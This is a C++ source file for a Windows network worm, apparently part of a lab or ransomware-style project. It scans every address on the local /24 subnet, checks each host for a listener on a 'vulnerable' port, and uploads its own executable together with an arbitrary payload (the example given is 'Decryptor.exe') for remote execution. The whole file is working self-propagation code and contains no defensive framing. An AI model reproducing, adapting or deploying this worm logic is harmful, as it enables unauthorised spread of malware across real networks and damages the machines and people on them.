// Worm.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <WinSock2.h>
#include <WS2tcpip.h>
#include "../Common/common.h"
#include "../Common/socktool.h"
#include "../Vulnerability/Vulnerability.h"
#include <tchar.h>
#include <stdio.h>
#pragma comment(lib,  "ws2_32.lib") 

INT RecvCode(SOCKET s)
{
	UCHAR code = 0;
	if (!RecvAll(s, (CHAR*)& code, sizeof(code), 0)) {
		return -1;
	}
	return code;
}

INT SendCode(SOCKET s, UCHAR code)
{
	if (!SendAll(s, (CHAR*)& code, sizeof(code), 0)) {
		return -1;
	}
	return 0;
}


SOCKET ConnectServer(
	CHAR* host,
	CHAR* port)
{
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;
	int iResult;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	DEBUG("getaddrinfo\n");
	// Resolve the server address and port
	iResult = getaddrinfo(
		host,
		port,
		&hints,
		&result);
	if (iResult != 0) {
		DEBUG("client: getaddrinfo failed with error: %d\n",
			iResult);
		return INVALID_SOCKET;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(
			ptr->ai_family,
			ptr->ai_socktype,
			ptr->ai_protocol);
		DEBUG("create socket\n");
		if (ConnectSocket == INVALID_SOCKET) {
			DEBUG("client: socket failed with error: %ld\n",
				WSAGetLastError());
			return INVALID_SOCKET;
		}
		// Connect to server.
		unsigned long iMode = 1;
		iResult = connect(
			ConnectSocket,
			ptr->ai_addr,
			(INT)ptr->ai_addrlen);
		if (iResult != SOCKET_ERROR)
		{
			break;
		}
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}
	DEBUG("client: freeaddrinfo\n");
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		DEBUG("client: Unable to connect to server!\n");
	}
	return ConnectSocket;
}

SOCKET ConnectServer_nb(
	CHAR* host,
	CHAR* port)
{
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;
	int iResult;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	DEBUG("getaddrinfo\n");
	iResult = getaddrinfo(
		host,
		port,
		&hints,
		&result);
	if (iResult != 0) {
		DEBUG("client: getaddrinfo failed with error: %d\n",
			iResult);
		return INVALID_SOCKET;
	}

	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		ConnectSocket = socket(
			ptr->ai_family,
			ptr->ai_socktype,
			ptr->ai_protocol);
		DEBUG("create socket\n");
		if (ConnectSocket == INVALID_SOCKET) {
			DEBUG("client: socket failed with error: %ld\n",
				WSAGetLastError());
			return INVALID_SOCKET;
		}
		unsigned long iMode = 1;
		iResult = ioctlsocket(
			ConnectSocket,
			FIONBIO,
			&iMode);
		if (iResult != NO_ERROR)
		{
			DEBUG("ioctlsocket failed with error: %ld\n",
				iResult);
		}
		iResult = connect(
			ConnectSocket,
			ptr->ai_addr,
			(INT)ptr->ai_addrlen);
		struct timeval tv;
		fd_set readfds, writefds;
		tv.tv_sec = 0;
		tv.tv_usec = 100;
		FD_ZERO(&readfds);
		FD_SET(ConnectSocket, &readfds);
		FD_ZERO(&writefds);
		FD_SET(ConnectSocket, &writefds);
		DEBUG("client: select debug5\n");
		if ((iResult =
			select(0, &readfds, &writefds, NULL, &tv))
			== SOCKET_ERROR ||
			(!FD_ISSET(ConnectSocket, &readfds) &&
				!FD_ISSET(ConnectSocket, &writefds))) {
			DEBUG("select: fails %d %d\n",
				iResult, GetLastError());
			DEBUG("closesocket\n");
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		DEBUG("*** connect successfully\n");
		// reset the socket mode
		iMode = 0;
		iResult = ioctlsocket(
			ConnectSocket,
			FIONBIO,
			&iMode);
		if (iResult != NO_ERROR)
		{
			DEBUG("ioctlsocket failed with error: %ld\n",
				iResult);
		}
		break;
	}
	DEBUG("client: freeaddrinfo\n");
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		DEBUG("client: Unable to connect to server!\n");
	}
	return ConnectSocket;
}

INT SendPing(CHAR* host, CHAR* port)
{
	CHAR replycode = 0;
	WSADATA wsaData;
	INT iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		DEBUG("client: WSAStartup failed with error: %d\n",
			iResult);
		return FALSE;
	}
	SOCKET s = ConnectServer_nb(host, port);
	if (s == INVALID_SOCKET) {
		WSACleanup();
		return FALSE;
	}
	DEBUG("Send ping 0x%x\n", PING);
	if (SendCode(s, PING) < 0) {
		goto ERREXIT;
	}
	if ((replycode = RecvCode(s)) != PONG) {
		DEBUG("replycode: %d\n", replycode);
		goto ERREXIT;
	}
	DEBUG("shutdown\n");
	iResult = shutdown(s, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		DEBUG("client: shutdown failed with error: %d\n",
			WSAGetLastError());
		goto ERREXIT;
	}
	DEBUG("Ping successfully\n");
	DEBUG("closesocket\n");
	closesocket(s);
	WSACleanup();
	return TRUE;
ERREXIT:
	DEBUG("closesocket\n");
	closesocket(s);
	WSACleanup();
	return FALSE;
}

INT SendFile(SOCKET s, LPTSTR filename)
{
	DEBUG("Create %s\n", filename);
	HANDLE hFile;
	if ((hFile = CreateFile(
		filename,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	)) == INVALID_HANDLE_VALUE) {
		DEBUG("open %s fails: %d\n",
			filename, GetLastError());
		return FALSE;
	}
	DWORD filesize = GetFileSize(hFile, NULL);
	DWORD readsize = 0;
	DWORD writesize = 0;
	INT iResult = TRUE;
	CHAR buffer[4096];
	CHAR replycode = 0;
	DEBUG("send filesize %d\n", filesize);
	if (!SendAll(
		s, (CHAR*)& filesize,
		sizeof(filesize),
		0)) {
		DEBUG("server: send failed with error: %d\n",
			WSAGetLastError());
		return FALSE;
	}
	if ((replycode = RecvCode(s)) < 0) {
		DEBUG("server: send failed with error: %d\n",
			WSAGetLastError());
		return FALSE;
	}
	DEBUG("send size successfully\n");
	while (writesize < filesize) {
		readsize = filesize - writesize;
		if (readsize > sizeof(buffer)) {
			readsize = sizeof(buffer);
		}
		if (!ReadFile(hFile, buffer, readsize, NULL, 0)) {
			iResult = FALSE;
			break;
		}
		DEBUG("send %d bytes\n", readsize);
		if (!SendAll(s, buffer, readsize, 0)) {
			DEBUG("server: send failed with error: %d\n",
				WSAGetLastError());
			iResult = FALSE;
			break;
		}
		if (RecvCode(s) != EXECOK) {
			DEBUG("server: send failed with error: %d\n",
				WSAGetLastError());
			iResult = FALSE;
			break;
		}
		writesize += readsize;
	}
	CloseHandle(hFile);
	return iResult;
}


INT SendFiles(
	CHAR* host,
	CHAR* port,
	LPTSTR wormfile,
	LPTSTR payload)
{
	UCHAR cmdcode = 0xC8;
	UCHAR replycode = 0;
	WSADATA wsaData;
	INT iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		DEBUG("client: WSAStartup failed with error: %d\n",
			iResult);
		return FALSE;
	}
	SOCKET s = ConnectServer(host, port);
	if (s == INVALID_SOCKET) {
		DEBUG("connect fails\n");
		return FALSE;
	}
	DEBUG("sendcode: %d\n", EXEC);
	if (SendCode(s, EXEC) < 0) {
		goto ERREXIT;
	}
	if ((replycode = RecvCode(s)) != EXECOK) {
		DEBUG("replycode: %d\n", replycode);
		goto ERREXIT;
	}
	DEBUG("replycode: %d\n", replycode);
	DEBUG("Client Send Worm %s\n", wormfile);
	if (!SendFile(s, wormfile)) {
		DEBUG("Client Send File %s Error\n", wormfile);
		return FALSE;
	}
	DEBUG("send %s successfully\n", wormfile);
	DEBUG("Client Send Payload %s\n", payload);
	if (!SendFile(s, payload)) {
		DEBUG("Client Send File %s Error\n", payload);
		return FALSE;
	}
	DEBUG("shutdown\n");
	iResult = shutdown(s, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		DEBUG("client: shutdown failed with error: %d\n",
			WSAGetLastError());
		DEBUG("closesocket\n");
		closesocket(s);
		return FALSE;
	}
	DEBUG("Ping successfully\n");
	DEBUG("closesocket\n");
	closesocket(s);
	WSACleanup();
	return TRUE;
ERREXIT:
	DEBUG("closesocket\n");
	closesocket(s);
	WSACleanup();
	return FALSE;
}

struct SEND_FILE_DATA {
	CHAR host[32];
	CHAR port[32];
	TCHAR WormEXE[MAX_PATH];
	TCHAR PayLoad[MAX_PATH];
};

INT Worm(SEND_FILE_DATA *data)
{
	CHAR* host = data->host;
	CHAR* port = data->port;
	LPTSTR wormfile = data->WormEXE;
	LPTSTR payload = data->PayLoad;
	printf("%s:%s\n", host, port);
	DEBUG("Client Send Ping\n");
	if (!SendPing(host, port)) {
		DEBUG("Client Send Ping Error\n");
		return FALSE;
	}
	DEBUG("Client Send Ping Success\n");
	//////////////////////////////////////////
	DEBUG("Connect to send file\n");
	if (!SendFiles(host, port, wormfile, payload)) {
		DEBUG("Client Send File %s Error\n",
			payload);
		WSACleanup();
		return FALSE;
	}


	return TRUE;
}

BOOL ScanVulnerability(
	LPTSTR wormfile,
	LPTSTR filename)
{
	SEND_FILE_DATA data[256];
	CHAR ip[32];
	INT i1, i2, i3, i4;
	GetLocalIP(ip, sizeof(ip));
	sscanf_s(ip, "%d.%d.%d.%d", &i1, &i2, &i3, &i4);
	for (INT i = 1; i < 255; i++) {
		sprintf_s(ip, sizeof(ip), "%d.%d.%d.%d",
			i1, i2, i3, i);
		printf("Testing %s...\n", ip);
		strcpy_s(data[i].host, ip);
		strcpy_s(data[i].port, HOLE_PORT);
		_tcscpy_s(data[i].WormEXE, wormfile);
		_tcscpy_s(data[i].PayLoad, filename);
		Worm(data + i);
	}
	return TRUE;
}

INT _tmain(INT argc, LPTSTR *argv)
{
	if (argc < 2) {
		DEBUG("Usage: %s PAYLOAD\n", argv[0]);
		DEBUG("Ex, %s Decryptor.exe\n", argv[0]);
		return 1;
	}
	ScanVulnerability(argv[0], argv[1]);
	return 0;
}
